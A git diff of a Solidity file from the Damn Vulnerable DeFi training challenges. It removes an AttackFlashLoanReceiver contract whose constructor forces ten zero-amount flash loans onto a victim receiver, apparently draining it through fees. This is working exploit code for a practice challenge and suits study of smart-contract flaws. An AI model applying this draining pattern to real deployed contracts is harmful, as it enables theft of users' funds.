@@ -3,26 +3,11 @@ pragma solidity 0.8.17;
 
 import {Address} from "openzeppelin-contracts/utils/Address.sol";
 import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";
-
-contract AttackFlashLoanReceiver {
-    using Address for address payable;
-
-    address payable private pool;
-    address payable private receiver;
-
-    constructor(address payable poolAddress, address payable receiverAddress) {
-        pool = poolAddress;
-        receiver = receiverAddress;
-        for (uint256 i = 0; i < 10; i++) {
-            NaiveReceiverLenderPool(pool).flashLoan(receiver, 0);
-        }
-    }
-}
-
 /**
  * @title FlashLoanReceiver
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
+
 contract FlashLoanReceiver {
     using Address for address payable;
 
